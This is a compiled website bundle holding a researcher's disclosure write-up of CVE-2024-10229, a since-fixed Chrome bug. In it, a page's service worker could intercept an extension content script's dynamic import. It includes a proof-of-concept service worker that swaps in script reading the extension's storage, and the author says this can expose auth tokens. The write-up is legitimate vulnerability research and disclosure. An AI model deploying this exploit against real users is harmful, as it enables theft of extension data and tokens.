"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[816],{7405:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>a,default:()=>h,frontMatter:()=>i,metadata:()=>r,toc:()=>l});const r=JSON.parse('{"id":"More/intro","title":"CVE-2024-10229","description":"This is a bonus article describing a CVE in Chrome that allowed me to bypass Context Isolation.","source":"@site/docs/More/intro.mdx","sourceDirName":"More","slug":"/More/intro","permalink":"/More/intro","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":1,"frontMatter":{"sidebar_position":1},"sidebar":"tutorialSidebar","previous":{"title":"More","permalink":"/category/more"}}');var o=n(4848),s=n(8453);const i={sidebar_position:1},a="CVE-2024-10229",c={},l=[{value:"Let&#39;s Exploit",id:"lets-exploit",level:2},{value:"Let&#39;s report",id:"lets-report",level:2}];function d(e){const t={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",li:"li",p:"p",pre:"pre",ul:"ul",...(0,s.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(t.header,{children:(0,o.jsx)(t.h1,{id:"cve-2024-10229",children:"CVE-2024-10229"})}),"\n",(0,o.jsx)(t.admonition,{title:"Note",type:"tip",children:(0,o.jsx)(t.p,{children:"This is a bonus article describing a CVE in Chrome that allowed me to bypass Context Isolation."})}),"\n",(0,o.jsx)(t.h1,{id:"overview",children:"Overview"}),"\n",(0,o.jsx)(t.p,{children:"At the end of 2024, I found a vulnerability in Chrome that allowed an attacker's site to execute scripts within the Content Script of vulnerable extensions."}),"\n",(0,o.jsxs)(t.p,{children:["If you have read the content of this site, you should remember that usually, a ",(0,o.jsx)(t.code,{children:"content script"})," is injected through the ",(0,o.jsx)(t.code,{children:"manifest"}),". However, I discovered that many large extensions (for example, ",(0,o.jsx)(t.a,{href:"https://chromewebstore.google.com/detail/1password/aeblfdkhhhdcdjpifhhbdiojplfjncoa",children:"1Password"}),") use the following logic:"]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-javascript",children:"(function () {\n    'use strict';\n  \n    const injectTime = performance.now();\n    (async () => {\n      const { onExecute } = await import(\n        /* @vite-ignore */\n        chrome.runtime.getURL(\"assets/example.js\")\n      );\n      onExecute?.({ perf: { injectTime, loadTime: performance.now() - injectTime } });\n    })().catch(console.error);\n  \n  })();\n"})}),"\n",(0,o.jsxs)(t.p,{children:["That is, they dynamically request scripts from the ",(0,o.jsx)(t.code,{children:"content script"}),". Studying the browser's behavior, I realized that the developers made a mistake. Usually, all traffic from the ",(0,o.jsx)(t.code,{children:"content script"})," originating from the Isolated World, as you can guess, is isolated. For example, an application cannot intercept a fetch request originating from the ",(0,o.jsx)(t.code,{children:"content script"}),". However, this logic was not implemented for ",(0,o.jsx)(t.code,{children:"import"}),"..."]}),"\n",(0,o.jsx)(t.h2,{id:"lets-exploit",children:"Let's Exploit"}),"\n",(0,o.jsxs)(t.p,{children:["After we understood that ",(0,o.jsx)(t.code,{children:"import"})," is not isolated, a simple plan emerges:"]}),"\n",(0,o.jsxs)(t.ul,{children:["\n",(0,o.jsxs)(t.li,{children:["Register a ",(0,o.jsx)(t.code,{children:"service worker"})," on your page."]}),"\n",(0,o.jsx)(t.li,{children:"Intercept the script and replace its content with your own."}),"\n"]}),"\n",(0,o.jsx)(t.p,{children:"In practice, this looked like this:"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-javascript",children:"self.addEventListener(\"fetch\", (event) => {\n    console.log(`Handling fetch event for ${event.request.url}!`);\n    if(event.request.url.indexOf(\"chrome-extension\") === -1){\n        event.respondWith(fetch(event.request.url));\n        return;\n    }\n    if(event.request.url.indexOf(\"chrome-extension\") != -1){\n        var a = new Response(`(async function foo() {\n            window.slonser=JSON.stringify(await chrome.storage.local.get());\n\n            document.body.innerHTML='I was stealing your storage:'+window.slonser; \n          })();`, {\n          headers: {'Content-Type': 'text/javascript', 'Access-Control-Allow-Origin':\"*\"}\n        })\n        event.respondWith(\n            a\n         )\n        return;\n    }\n    return;\n});\n"})}),"\n",(0,o.jsx)(t.p,{children:"Accordingly, by running such a worker on your site, you could steal user data (I discovered quite a few extensions that stored auth tokens in storage, LOL) and sometimes even achieve UXSS (but you probably guessed this if you read this site)."}),"\n",(0,o.jsx)(t.h2,{id:"lets-report",children:"Let's report"}),"\n",(0,o.jsxs)(t.p,{children:["I ",(0,o.jsx)(t.a,{href:"https://issues.chromium.org/issues/371011220",children:"reported"})," this issue to the Chrome security team. Within a week, it was resolved, and I received $10,000."]})]})}function h(e={}){const{wrapper:t}={...(0,s.R)(),...e.components};return t?(0,o.jsx)(t,{...e,children:(0,o.jsx)(d,{...e})}):d(e)}},8453:(e,t,n)=>{n.d(t,{R:()=>i,x:()=>a});var r=n(6540);const o={},s=r.createContext(o);function i(e){const t=r.useContext(s);return r.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function a(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:i(e.components),r.createElement(s.Provider,{value:t},e.children)}}}]);